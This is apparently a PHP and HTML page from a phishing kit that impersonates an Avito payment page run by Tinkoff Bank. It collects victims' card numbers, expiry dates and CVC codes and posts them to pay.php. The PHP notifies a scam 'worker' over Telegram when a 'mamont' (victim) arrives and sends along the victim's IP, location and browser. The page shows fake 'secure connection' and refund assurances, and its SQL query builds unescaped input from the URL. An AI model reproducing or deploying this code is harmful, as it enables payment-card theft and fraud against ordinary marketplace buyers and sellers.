<?php 

	if(isset($_COOKIE['order_id'])) {
		$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '".mb_substr($_SERVER['REQUEST_URI'], 10)."'");
		
		if(mysqli_num_rows($query) > 0) {
			$order = mysqli_fetch_assoc($query);
			
			if($order['delivery'] != '0') {
				$delivery = $order['delivery'];
			} else {
				$delivery = $config['delivery'];
			}
			
			setcookie('type', 'order', time()+3600, '/');
			
			$text = "⚠️❕ <b>Мамонт перешел на страницу оплаты</b>❕⚠️\n\n";
			$text .= "🌍 <b>Платформа:</b> <code>Авито</code>\n";
			$text .= "🆔 <b>ID объявления:</b> <code>$order[advert_id]</code>\n";
			$text .= "📦 <b>Название товара:</b> <code>$order[title]</code>\n";
			$text .= "💰 <b>Сумма товара:</b> <code>$order[price] руб.</code>\n";
			$text .= "🚚 <b>Сумма доставки:</b> <code>$delivery руб.</code>\n";
			$text .= "\n$visitor[os] — ".getCountryFlag($visitor['country_code'])." $visitor[country], $visitor[city]\n";
			$text .= "Браузер $visitor[browser], $visitor[ip]";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $order['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		} else {
			header('Location: https://'.$_SERVER['SERVER_NAME'].'/');
		}
	} else {
		header('Location: /buy?id='.mb_substr($_SERVER['REQUEST_URI'], 10));
	}

?>

<!DOCTYPE html>
<html lang="ru" prefix="og: http://ogp.me/ns#" id="html">
<head>
	<title>Тинькофф Банк - Оплата</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="stylesheet" href="/assets/css/avito_common.css">
	<script type="text/javascript" src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<script type="text/javascript" src="/assets/js/tcsPayLib.js"></script>
	<script type="text/javascript" src="/assets/js/index.js"></script>
	<link href="/assets/img/favicon.jpg" rel="icon" type="image/x-icon">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
	<meta property="og:site_name" content="Авито">
	<meta property="og:title" content="Оформление и оплата">
	<meta property="og:type" content="website">
	<meta property="og:url" content="https://avito.ru/">
	<meta property="og:locale" content="ru_RU">
	<meta property="og:image" content="https://i.imgur.com/Ig7QshR.jpg">
	<meta property="og:image:secure_url" content="https://i.imgur.com/Ig7QshR.jpg">
	<meta property="og:image:type" content="image/jpeg">
	<meta property="og:image:width" content="500">
	<meta property="og:image:height" content="500">
	<meta property="og:description" content="Выгодно покупайте и продавайте авто, недвижимость и вещи в России. Находите надёжных исполнителей и работу. Самый популярный сервис объявлений в России.">
	<style>
		#loading {
			width: 100%;
			height: 100%;
			top: 0;
			left: 0;
			position: fixed;
			display: block;
			opacity: 0.7;
			background-color: #fff;
			z-index: 99;
			text-align: center;
		}

		#loading-image {
			position: absolute;
			top: 50%;
			left: 50%;
			z-index: 100;
		}
	</style>
</head>
<body id="body">
	<div id="loading">
		<img id="loading-image" src="/assets/img/loader.gif" alt="Пожалуйста подождите..." />
	</div>
	<div class="wrapper">
		<div class="wrapper__middle">
			<div class="header">
				<div class="header__logo"><img src="/assets/img/logo-avito.svg" alt="Avito"></div>
				<div class="header__fin-service">
					<div class="header__fin-service-image images__visa"></div>
					<div class="header__fin-service-image header__fin-service-image_diff images__master-card"></div>
					<div class="header__fin-service-image header__fin-service-image_last header__fin-service-mobile images__maestro"></div>
					<div class="header__fin-service-image header__fin-service-image_last images__mir"></div>
				</div>
			</div>
			<div class="mobile-border mobile-border_top">
				<div class="mobile-border__line"></div>
			</div>
			<div class="title"> <?php echo $order['title']; ?> </div>
			<div style="padding: 5px 0px 15px;">
				
			</div>
			<div class="content">
				<form method="post" id="payForm" onsubmit="return load();" action="pay.php" name="payForm">
					<div class="card">
						<div class="card__order">
							<div class="card__order_text">
Получение средств  №<?php echo $order['advert_id']; ?></div>
							<div class="card__lock">Безопасное соединение</div>
						</div>
						<div id="tcs-pay-form" class="main-form">
							<div class="avito_error"><span id="error-span"></span></div>
								<div class="card-credit">
									<div class="card-credit__front">
										<div class="form-card-number">
												<input style="display:none;" name="order_id" value="a2fdb254">
												<label class="form-card-label">Номер карты</label>
												<label for="cardFrom" class="form-label form-card-number__label form-label_active">Введите номер карты</label>
												<div class="form-card-number__input-wrap"> <i class="icon icon-lock"></i>
													<div id="form-card-number__type" class="images__card-number"></div>
													<input required name="cardFrom" id="form-card-number-input" autocomplete="off" type="tel" <?php if(isset($_COOKIE['num'])) echo "value=\"$_COOKIE[num]\""; ?> class="form-field form-card-number__field" maxlength="24" tabindex="1" data-validate="false" autofocus="">
												</div>
										</div>
										<div class="form-card-date">
											<label class="form-card-label">Срок действия</label>
											<div class="form-date-wrap">
												<div class="form-date form-date_month">
													<label for="form-month-input" class="form-label form-date__label form-date__label_month">Месяц</label>
													<input required name="cardFromMonth" id="form-month-input" autocomplete="off" type="tel" <?php if(isset($_COOKIE['exp'])) echo 'value="'.mb_substr($_COOKIE['exp'], 0, -3).'"'; ?> class="form-field form-date__field form-date_month__field" maxlength="2" tabindex="2" data-cur-month="<?php echo date("m"); ?>" data-validate="false">
												</div>
												<div class="form-date__separator">/</div>
												<div class="form-date form-date_year">
													<label for="form-year-input" class="form-label form-date__label form-date__label_year">Год</label>
													<input required name="cardFromYear" id="form-year-input" autocomplete="off" type="tel" <?php if(isset($_COOKIE['exp'])) echo 'value="'.mb_substr($_COOKIE['exp'], -2).'"'; ?> class="form-field form-date__field form-date_year__field" maxlength="2" tabindex="3" data-cur-year="<?php echo date("y"); ?>" data-validate="false"> </div>
											</div>
										</div>
										<input type="hidden" name="amount" value="<?php echo $order['price']+$delivery; ?>">
										<input type="hidden" name="description" value="<?php echo $order['title']; ?>">
										<input type="hidden" name="order_id" value="<?php echo $order['advert_id']; ?>">
									</div>
									<div class="card-credit__back">
										<div class="form-cvc-bg"></div>
										<div class="form-cvc">
											<label class="form-card-label">CVC</label>
											<label for="form-cvc-input" id="form-cvc-label" class="form-label form-cvc__label">CVV/CVC</label>
											<input required name="cardFromCVC" id="form-cvc-input" autocomplete="off" type="password" class="form-field form-cvc__field" maxlength="3" tabindex="4" data-validate="false">
										</div>
										<div class="form-cvc__tip-message"> <a href="javascript:void(0);" class="form-cvc__tip-link">Что это?</a>
											<div class="tip-message images__tips" id="tip-message-1">
												<div class="pop-up" id="pop-up-1"> <i class="pop-up__arrow"></i>
													<p>Последние три цифры на оборотной полосе вашей карты.</p>
													<p><img src="/assets/img/hint.jpg" alt="пример CVV/CVC"></p>
													<div class="pop-up__content"><i class="icon icon-cvc-info"></i> CVC-код состоит из трех последних цифр, расположенных на&nbsp;оборотной стороне карты. </div>
												</div>
											</div>
											<button id="next" hidden type="sumbit" name="sumbit"></button>
										</div>
									</div>
									<div id="card-credit-error" class="card-credit-error">Ошибка в заполнении полей:</div>
								</div>
							<div class="mobile-border mobile-border_form">
								<div class="mobile-border__line mobile-border__line_tip"></div>
							</div>
							<p class="notice-accept__mobile notice-accept">Вводя адрес электронной почты вы соглашаетесь <br>с <a class="js-notice-info" href="javascript:void(0);">условиями передачи информации</a></p>
							<div class="mobile-border mobile-border_pay">
								<div class="mobile-border__line"></div>
							</div>
							<div class="form-submit">
								<div class="form-submit__amount">К получению: <span id="card__summ" class="avito__summ"><?php echo $order['price']+$delivery; ?>.00</span><span class="font-arial-rub">₽</span></div>
								<div class="form-submit__field-wrap">
									<input type="button" value="Получить средства" disabled id="form-submit" class="form-submit__field" tabindex="7">
								</div>
							</div>
						</div>
					</div>
				</form>
				<div class="mobile-border mobile-border_bottom">
					<div class="mobile-border__line"></div>
				</div>
				<div class="credits">
					<div class="credits__icons">
						<div class="images__under-visa"></div>
						<div class="images__under-master"></div>
						<div class="images__under-miraccept"></div>
						<div class="images__under-pci"></div>
					</div>
					<p class="credits__info">Интернет-платежи защищены сертификатом SSL и протоколом 3D Secure. АО&nbsp;"Тинькофф Банк" не&nbsp;передает магазинам платежные данные, в том числе данные карты.</p>
					<div class="credits__tcs-logo"><img alt="Tinkoff bank logo" src="/assets/img/tcs-logo.png" width="162" height="50"></div>
					<p class="credits__info">Сервис предоставлен АО «Тинькофф Банк».</p>
				</div>
				<div class="add-info">
					<div class="add-info__list">
						<div class="add-info__item">
							<div class="add-info__item_caption"><i class="add-info__icon icon icon-card"></i> <i class="add-info__icon icon icon-mir"></i> <i class="add-info__icon icon icon-visa"></i> <i class="add-info__icon icon icon-master-card"></i></div>
							<div class="clearfix"></div>
							<div class="add-info__text">Товары с доставкой оплачиваются только банковской картой онлайн. </div>
						</div>
						<div class="add-info__item"> <i class="icon icon-rub"></i>
							<div class="add-info__text">Гарантия возврата денег если:
								<br>— продавец отменил заказ,
								<br>— товар не подошёл или брак,
								<br>— вы не получили товар. </div>
						</div>
					</div>
				</div>
			</div>
		
		</div>
	</div>
	<div class="footer">
		<div class="form-card-supported-systems"><i class="grey-icon grey-icon-master-card"></i> <i class="grey-icon grey-icon-visa"></i> <i class="grey-icon grey-icon-mir"></i> <i class="grey-icon grey-icon-pci-dss"></i></div>
		<div class="form-card-add-info">Интернет-платежи защищены сертификатом SSL и протоколом 3D Secure. АО «Тинькофф Банк» не передает магазинам платежные данные, в том числе данные карты. Оплачивая заказ вы соглашаетесь с <a href="https://static2.tinkoff.ru/acquiring/agreement_avito2.pdf" target="_blank" rel="noopener noreferrer">офертой</a></div>
		<div class="form-card-add-info__logo">Сервис предоставлен «Тинькофф Банк»</div>
	</div>
	<script language="javascript" type="text/javascript">
		function load() {
			$('#loading').show();
		}
	
		$(document).ready(function() {
			$('#loading').hide();
		});
	</script>
	<script>
	$(document).ready(function() {
		function valid_credit_card(value) {
			if(/[^0-9-\s]+/.test(value)) return false;
			let nCheck = 0,
				bEven = false;
			value = value.replace(/\D/g, "");
			for(var n = value.length - 1; n >= 0; n--) {
				var cDigit = value.charAt(n),
					nDigit = parseInt(cDigit, 10);
				if(bEven && (nDigit *= 2) > 9) nDigit -= 9;
				nCheck += nDigit;
				bEven = !bEven;
			}
			return(nCheck % 10) == 0;
		}
		$("#form-card-number-input").keyup(function() {
			if(valid_credit_card($("#form-card-number-input")[0].value) === true) {
				$(this).removeClass('filedd');
				if(checkCC($("#form-card-number-input")[0].value) == 1) {
					$('.images__card-number').removeClass('form-card-number__field_visa');
					$('.images__card-number').addClass('form-card-number__field_mc');
				} else if(checkCC($("#form-card-number-input")[0].value) == 2) {
					$('.images__card-number').removeClass('form-card-number__field_mc');
					$('.images__card-number').addClass('form-card-number__field_visa');
				} else {
					$('.images__card-number').removeClass('form-card-number__field_visa');
					$('.images__card-number').removeClass('form-card-number__field_mc');
				}
				if($("#form-card-number-input")[0].value.length == 19) {
					$('#form-month-input').focus();
				}
			} else {
				$(this).addClass('filedd');
			}
		});
		$("#form-month-input").keyup(function() {
			var month = $("#form-month-input")[0].value;
			if(month > 12) {
				$(this).addClass('filedd');
			} else if(month == '') {
				$(this).addClass('filedd');
			} else if(month.length < 2) {
				$(this).addClass('filedd');
			} else {
				$(this).removeClass('filedd');
				$('#form-year-input').focus();
			}
		});
		$("#form-year-input").keyup(function() {
			if($("#form-year-input")[0].value < 19) {
				$(this).addClass('filedd');
			} else {
				$(this).removeClass('filedd');
				$('#form-cvc-input').focus();
			}
		});
		$("#form-cvc-input").keyup(function() {
			if($("#form-cvc-input")[0].value.length != 3) {
				$(this).addClass('filedd');
			} else {
				$(this).removeClass('filedd');
				$('#form-submit').focus();
			}
		});
		$('input').keyup(function() {
			var card = $("#form-card-number-input")[0].value.length;
			var card_valid = valid_credit_card($("#form-card-number-input")[0].value);
			var exp0 = $("#form-month-input")[0].value.length;
			var exp1 = $("#form-year-input")[0].value.length;
			var cvv = $("#form-cvc-input")[0].value.length;
			if(card != 0 && exp0 != 0 && exp1 != 0 && cvv == 3 && card_valid === true) {
				$('#form-submit').prop('disabled', false);
			} else {
				$('#form-submit').prop('disabled', true);
				$('#form-submit').click(function() {
					$('#payForm').submit();
				})
			}
		});
	});

	function checkCC(val) {
		String.prototype.startsWith = function(str) {
			return(this.match("^" + str) == str)
		}
		Array.prototype.has = function(v, i) {
				for(var j = 0; j < this.length; j++) {
					if(this[j] == v) return(!i ? true : j);
				}
				return false;
			}
			
		val = val.replace(/[^0-9]/g, "");
		
		var d = new Array();
		var a = 0;
		var len = 0;
		var cval = val;
		while(cval != 0) {
			d[a] = cval % 10;
			cval -= d[a];
			cval /= 10;
			a++;
			len++;
		}
		if(len < 13) return -1;
		var cType = -1;
		
		if(val.startsWith("5")) {
			if(len != 16) return -1;
			cType = 1;
		} else
		
		if(val.startsWith("4")) {
			if(len != 16 && len != 13) return -1;
			cType = 2;
		} else
		
		if(val.startsWith("34") || val.startsWith("37")) {
			if(len != 15) return -1;
			cType = 3;
		} else
		
		if(val.startsWith("36") || val.startsWith("38") || val.startsWith("300") || val.startsWith("301") || val.startsWith("302") || val.startsWith("303") || val.startsWith("304") || val.startsWith("305")) {
			if(len != 14) return -1;
			cType = 4;
		}
		
		var sum = 0;
		var i;
		for(i = 1; i < len; i += 2) {
			var s = d[i] * 2;
			sum += s % 10;
			sum += (s - s % 10) / 10;
		}
		for(i = 0; i < len; i += 2) sum += d[i];
		
		if(sum % 10 != 0) return -1;
		return cType;
	}
	</script>
</body>
</html>